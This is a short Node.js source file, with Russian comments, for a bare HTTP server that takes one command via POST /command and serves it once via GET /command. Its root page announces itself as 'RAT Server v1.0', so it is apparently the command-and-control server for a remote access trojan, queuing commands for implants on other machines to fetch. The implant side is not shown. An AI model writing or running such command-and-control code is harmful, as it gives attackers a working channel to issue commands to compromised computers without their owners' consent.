const http = require('http');

let lastCommand = ""; // Храним последнюю команду

const server = http.createServer((req, res) => {
  // Обработка POST /command (установка команды)
  if (req.url === '/command' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      lastCommand = JSON.parse(body).command;
      res.writeHead(200);
      res.end("OK");
    });
    return;
  }

  // Обработка GET /command (получение команды)
  if (req.url === '/command' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ command: lastCommand }));
    lastCommand = ""; // Очищаем команду после отправки
    return;
  }

  // Для корневого пути (/)
  if (req.url === '/' && req.method === 'GET') {
    res.writeHead(200);
    res.end("RAT Server v1.0 | Status: ONLINE");
    return;
  }

  // Все остальные запросы
  res.writeHead(404);
  res.end("Not Found");
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server started on port ${PORT}`));
